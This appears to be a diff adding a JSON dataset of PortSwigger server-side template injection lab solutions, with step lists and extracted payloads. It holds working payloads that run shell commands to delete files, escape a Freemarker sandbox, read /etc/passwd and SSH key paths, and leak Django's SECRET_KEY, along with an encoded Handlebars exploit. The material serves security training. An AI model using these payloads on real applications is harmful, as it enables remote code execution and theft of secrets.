@@ -1,0 +1,183 @@
+[
+  {
+    "url": "https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic",
+    "category": "server-side-template-injection",
+    "title": "Basic server-side template injection",
+    "description": "This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.",
+    "solution_steps": [
+      "Notice that when you try to view more details about the first product, a GET request uses the message parameter to render \"Unfortunately this product is out of stock\" on the home page.",
+      "In the ERB documentation, discover that the syntax <%= someExpression %> is used to evaluate an expression and render the result on the page.",
+      "Use ERB template syntax to create a test payload containing a mathematical operation, for example: <%= 7*7 %>",
+      "URL-encode this payload and insert it as the value of the message parameter in the URL as follows, remembering to replace YOUR-LAB-ID with your own lab ID: https://YOUR-LAB-ID.web-security-academy.net/?message=<%25%3d+7*7+%25>",
+      "Load the URL in the browser. Notice that in place of the message, the result of your mathematical operation is rendered on the page, in this case, the number 49. This indicates that we may have a server-side template injection vulnerability.",
+      "From the Ruby documentation, discover the system() method, which can be used to execute arbitrary operating system commands.",
+      "Construct a payload to delete Carlos's file as follows: <%= system(\"rm /home/carlos/morale.txt\") %>",
+      "URL-encode your payload and insert it as the value of the message parameter, remembering to replace YOUR-LAB-ID with your own lab ID: https://YOUR-LAB-ID.web-security-academy.net/?message=<%25+system(\"rm+/home/carlos/morale.txt\")+%25>"
+    ],
+    "solution": "1. Notice that when you try to view more details about the first product, a GET request uses the message parameter to render \"Unfortunately this product is out of stock\" on the home page.\n2. In the ERB documentation, discover that the syntax <%= someExpression %> is used to evaluate an expression and render the result on the page.\n3. Use ERB template syntax to create a test payload containing a mathematical operation, for example: <%= 7*7 %>\n4. URL-encode this payload and insert it as the value of the message parameter in the URL as follows, remembering to replace YOUR-LAB-ID with your own lab ID: https://YOUR-LAB-ID.web-security-academy.net/?message=<%25%3d+7*7+%25>\n5. Load the URL in the browser. Notice that in place of the message, the result of your mathematical operation is rendered on the page, in this case, the number 49. This indicates that we may have a server-side template injection vulnerability.\n6. From the Ruby documentation, discover the system() method, which can be used to execute arbitrary operating system commands.\n7. Construct a payload to delete Carlos's file as follows: <%= system(\"rm /home/carlos/morale.txt\") %>\n8. URL-encode your payload and insert it as the value of the message parameter, remembering to replace YOUR-LAB-ID with your own lab ID: https://YOUR-LAB-ID.web-security-academy.net/?message=<%25+system(\"rm+/home/carlos/morale.txt\")+%25>",
+    "payloads": [
+      "morale.txt",
+      "message",
+      "\"Unfortunately this product is out of stock\"",
+      "<%= someExpression %>",
+      "<%= 7*7 %>",
+      "YOUR-LAB-ID",
+      "https://YOUR-LAB-ID.web-security-academy.net/?message=<%25%3d+7*7+%25>",
+      "system()",
+      "<%= system(\"rm /home/carlos/morale.txt\") %>",
+      "https://YOUR-LAB-ID.web-security-academy.net/?message=<%25+system(\"rm+/home/carlos/morale.txt\")+%25>"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context",
+    "category": "server-side-template-injection",
+    "title": "Basic server-side template injection (code context)",
+    "description": "This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete themorale.txtfile from Carlos's home directory.",
+    "solution": "Take a closer look at the \"preferred name\" functionality.",
+    "payloads": [
+      "morale.txt",
+      "wiener:peter",
+      "POST",
+      "blog-post-author-display",
+      "user.name",
+      "user.first_name",
+      "user.nickname",
+      "POST /my-account/change-blog-post-author-display",
+      "{{someExpression}}",
+      "blog-post-author-display=user.name}}{{7*7}}",
+      "Peter Wiener49}}",
+      "{% somePython %}",
+      "system()",
+      "{% import os %}\n{{os.system('rm /home/carlos/morale.txt')",
+      "blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment",
+    "category": "server-side-template-injection",
+    "title": "Server-side template injection in a sandboxed environment",
+    "description": "This lab uses the Freemarker template engine. It is vulnerable to server-side template injection due to its poorly implemented sandbox. To solve the lab, break out of the sandbox to read the filemy_password.txtfrom Carlos's home directory. Then submit the contents of the file.",
+    "solution_steps": [
+      "Log in and edit one of the product description templates. Notice that you have access to the product object.",
+      "Load the JavaDoc for the Object class to find methods that should be available on all objects. Confirm that you can execute ${object.getClass()} using the product object.",
+      "Explore the documentation to find a sequence of method invocations that grant access to a class with a static method that lets you read a file, such as: ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(\" \")}",
+      "Enter this payload in one of the templates and save. The output will contain the contents of the file as decimal ASCII code points.",
+      "Convert the returned bytes to ASCII.",
+      "Click the \"Submit solution\" button and submit this string to solve the lab."
+    ],
+    "solution": "1. Log in and edit one of the product description templates. Notice that you have access to the product object.\n2. Load the JavaDoc for the Object class to find methods that should be available on all objects. Confirm that you can execute ${object.getClass()} using the product object.\n3. Explore the documentation to find a sequence of method invocations that grant access to a class with a static method that lets you read a file, such as: ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(\" \")}\n4. Enter this payload in one of the templates and save. The output will contain the contents of the file as decimal ASCII code points.\n5. Convert the returned bytes to ASCII.\n6. Click the \"Submit solution\" button and submit this string to solve the lab.",
+    "payloads": [
+      "my_password.txt",
+      "content-manager:C0nt3ntM4n4g3r",
+      "product",
+      "Object",
+      "${object.getClass()}",
+      "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(\" \")}"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit",
+    "category": "server-side-template-injection",
+    "title": "Server-side template injection in an unknown language with a documented exploit",
+    "description": "This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete themorale.txtfile from Carlos's home directory.",
+    "solution_steps": [
+      "Notice that when you try to view more details about the first product, a GET request uses the message parameter to render \"Unfortunately this product is out of stock\" on the home page.",
+      "Experiment by injecting a fuzz string containing template syntax from various different template languages, such as ${{<%[%'\"}}%\\ , into the message parameter. Notice that when you submit invalid syntax, an error message is shown in the output. This identifies that the website is using Handlebars.",
+      "Search the web for \"Handlebars server-side template injection\". You should find a well-known exploit posted by @Zombiehelp54 .",
+      "Modify this exploit so that it calls require(\"child_process\").exec(\"rm /home/carlos/morale.txt\") as follows: wrtz{{#with \"s\" as |string|}}\n    {{#with \"e\"}}\n        {{#with split as |conslist|}}\n            {{this.pop}}\n            {{this.push (lookup string.sub \"constructor\")}}\n            {{this.pop}}\n            {{#with string.split as |codelist|}}\n                {{this.pop}}\n                {{this.push \"return require('child_process').exec('rm /home/carlos/morale.txt');\"}}\n                {{this.pop}}\n                {{#each conslist}}\n                    {{#with (string.sub.apply 0 codelist)}}\n                        {{this}}\n                    {{/with}}\n                {{/each}}\n            {{/with}}\n        {{/with}}\n    {{/with}}\n{{/with}}",
+      "URL encode your exploit and add it as the value of the message parameter in the URL. The final exploit should look like this, but remember to replace YOUR-LAB-ID with your own lab ID: https://YOUR-LAB-ID.web-security-academy.net/?message=wrtz%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d",
+      "The lab should be solved when you load the URL."
+    ],
+    "solution": "1. Notice that when you try to view more details about the first product, a GET request uses the message parameter to render \"Unfortunately this product is out of stock\" on the home page.\n2. Experiment by injecting a fuzz string containing template syntax from various different template languages, such as ${{<%[%'\"}}%\\ , into the message parameter. Notice that when you submit invalid syntax, an error message is shown in the output. This identifies that the website is using Handlebars.\n3. Search the web for \"Handlebars server-side template injection\". You should find a well-known exploit posted by @Zombiehelp54 .\n4. Modify this exploit so that it calls require(\"child_process\").exec(\"rm /home/carlos/morale.txt\") as follows: wrtz{{#with \"s\" as |string|}}\n    {{#with \"e\"}}\n        {{#with split as |conslist|}}\n            {{this.pop}}\n            {{this.push (lookup string.sub \"constructor\")}}\n            {{this.pop}}\n            {{#with string.split as |codelist|}}\n                {{this.pop}}\n                {{this.push \"return require('child_process').exec('rm /home/carlos/morale.txt');\"}}\n                {{this.pop}}\n                {{#each conslist}}\n                    {{#with (string.sub.apply 0 codelist)}}\n                        {{this}}\n                    {{/with}}\n                {{/each}}\n            {{/with}}\n        {{/with}}\n    {{/with}}\n{{/with}}\n5. URL encode your exploit and add it as the value of the message parameter in the URL. The final exploit should look like this, but remember to replace YOUR-LAB-ID with your own lab ID: https://YOUR-LAB-ID.web-security-academy.net/?message=wrtz%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d\n6. The lab should be solved when you load the URL.",
+    "payloads": [
+      "morale.txt",
+      "message",
+      "\"Unfortunately this product is out of stock\"",
+      "${{<%[%'\"}}%\\",
+      "@Zombiehelp54",
+      "require(\"child_process\").exec(\"rm /home/carlos/morale.txt\")",
+      "YOUR-LAB-ID"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation",
+    "category": "server-side-template-injection",
+    "title": "Server-side template injection using documentation",
+    "description": "This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete themorale.txtfile from Carlos's home directory.",
+    "solution": "You should try solving this lab using only the documentation. However, if you get really stuck, you can try finding a well-known exploit by @albinowax that you can use to solve the lab.",
+    "payloads": [
+      "morale.txt",
+      "content-manager:C0nt3ntM4n4g3r",
+      "${someExpression}",
+      "${foobar}",
+      "new()",
+      "TemplateModel",
+      "Execute",
+      "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"rm /home/carlos/morale.txt\") }"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit",
+    "category": "server-side-template-injection",
+    "title": "Server-side template injection with a custom exploit",
+    "description": "This lab is vulnerable to server-side template injection. To solve the lab, create a custom exploit to delete the file/.ssh/id_rsafrom Carlos's home directory.",
+    "solution_steps": [
+      "While proxying traffic through Burp, log in and post a comment on one of the blogs.",
+      "Go to the \"My account\" page. Notice that the functionality for setting a preferred name is vulnerable to server-side template injection, as we saw in a previous lab. You should also have noticed that you have access to the user object.",
+      "Investigate the custom avatar functionality. Notice that when you upload an invalid image, the error message discloses a method called user.setAvatar() . Also take note of the file path /home/carlos/User.php . You will need this later.",
+      "Upload a valid image as your avatar and load the page containing your test comment.",
+      "In Burp Repeater, open the POST request for changing your preferred name and use the blog-post-author-display parameter to set an arbitrary file as your avatar: user.setAvatar('/etc/passwd')",
+      "Load the page containing your test comment to render the template. Notice that the error message indicates that you need to provide an image MIME type as the second argument. Provide this argument and view the comment again to refresh the template: user.setAvatar('/etc/passwd','image/jpg')",
+      "To read the file, load the avatar using GET /avatar?avatar=wiener . This will return the contents of the /etc/passwd file, confirming that you have access to arbitrary files.",
+      "Repeat this process to read the PHP file that you noted down earlier: user.setAvatar('/home/carlos/User.php','image/jpg')",
+      "In the PHP file, Notice that you have access to the gdprDelete() function, which deletes the user's avatar. You can combine this knowledge to delete Carlos's file.",
+      "First set the target file as your avatar, then view the comment to execute the template: user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')",
+      "Invoke the user.gdprDelete() method and view your comment again to solve the lab."
+    ],
+    "solution": "1. While proxying traffic through Burp, log in and post a comment on one of the blogs.\n2. Go to the \"My account\" page. Notice that the functionality for setting a preferred name is vulnerable to server-side template injection, as we saw in a previous lab. You should also have noticed that you have access to the user object.\n3. Investigate the custom avatar functionality. Notice that when you upload an invalid image, the error message discloses a method called user.setAvatar() . Also take note of the file path /home/carlos/User.php . You will need this later.\n4. Upload a valid image as your avatar and load the page containing your test comment.\n5. In Burp Repeater, open the POST request for changing your preferred name and use the blog-post-author-display parameter to set an arbitrary file as your avatar: user.setAvatar('/etc/passwd')\n6. Load the page containing your test comment to render the template. Notice that the error message indicates that you need to provide an image MIME type as the second argument. Provide this argument and view the comment again to refresh the template: user.setAvatar('/etc/passwd','image/jpg')\n7. To read the file, load the avatar using GET /avatar?avatar=wiener . This will return the contents of the /etc/passwd file, confirming that you have access to arbitrary files.\n8. Repeat this process to read the PHP file that you noted down earlier: user.setAvatar('/home/carlos/User.php','image/jpg')\n9. In the PHP file, Notice that you have access to the gdprDelete() function, which deletes the user's avatar. You can combine this knowledge to delete Carlos's file.\n10. First set the target file as your avatar, then view the comment to execute the template: user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')\n11. Invoke the user.gdprDelete() method and view your comment again to solve the lab.",
+    "payloads": [
+      "/.ssh/id_rsa",
+      "wiener:peter",
+      "user",
+      "user.setAvatar()",
+      "/home/carlos/User.php",
+      "POST",
+      "blog-post-author-display",
+      "user.setAvatar('/etc/passwd')",
+      "user.setAvatar('/etc/passwd','image/jpg')",
+      "GET /avatar?avatar=wiener",
+      "/etc/passwd",
+      "user.setAvatar('/home/carlos/User.php','image/jpg')",
+      "gdprDelete()",
+      "user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')",
+      "user.gdprDelete()"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects",
+    "category": "server-side-template-injection",
+    "title": "Server-side template injection with information disclosure via user-supplied objects",
+    "description": "This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.",
+    "solution_steps": [
+      "Log in and edit one of the product description templates.",
+      "Change one of the template expressions to something invalid, such as a fuzz string ${{<%[%'\"}}%\\ , and save the template. The error message in the output hints that the Django framework is being used.",
+      "Study the Django documentation and notice that the built-in template tag debug can be called to display debugging information.",
+      "In the template, remove your invalid syntax and enter the following statement to invoke the debug built-in: {% debug %}",
+      "Save the template. The output will contain a list of objects and properties to which you have access from within this template. Crucially, notice that you can access the settings object.",
+      "Study the settings object in the Django documentation and notice that it contains a SECRET_KEY property, which has dangerous security implications if known to an attacker.",
+      "In the template, remove the {% debug %} statement and enter the expression {{settings.SECRET_KEY}}",
+      "Save the template to output the framework's secret key.",
+      "Click the \"Submit solution\" button and submit the secret key to solve the lab."
+    ],
+    "solution": "1. Log in and edit one of the product description templates.\n2. Change one of the template expressions to something invalid, such as a fuzz string ${{<%[%'\"}}%\\ , and save the template. The error message in the output hints that the Django framework is being used.\n3. Study the Django documentation and notice that the built-in template tag debug can be called to display debugging information.\n4. In the template, remove your invalid syntax and enter the following statement to invoke the debug built-in: {% debug %}\n5. Save the template. The output will contain a list of objects and properties to which you have access from within this template. Crucially, notice that you can access the settings object.\n6. Study the settings object in the Django documentation and notice that it contains a SECRET_KEY property, which has dangerous security implications if known to an attacker.\n7. In the template, remove the {% debug %} statement and enter the expression {{settings.SECRET_KEY}}\n8. Save the template to output the framework's secret key.\n9. Click the \"Submit solution\" button and submit the secret key to solve the lab.",
+    "payloads": [
+      "content-manager:C0nt3ntM4n4g3r",
+      "${{<%[%'\"}}%\\",
+      "debug",
+      "{% debug %}",
+      "settings",
+      "SECRET_KEY",
+      "{{settings.SECRET_KEY}}"
+    ]
+  }
+]
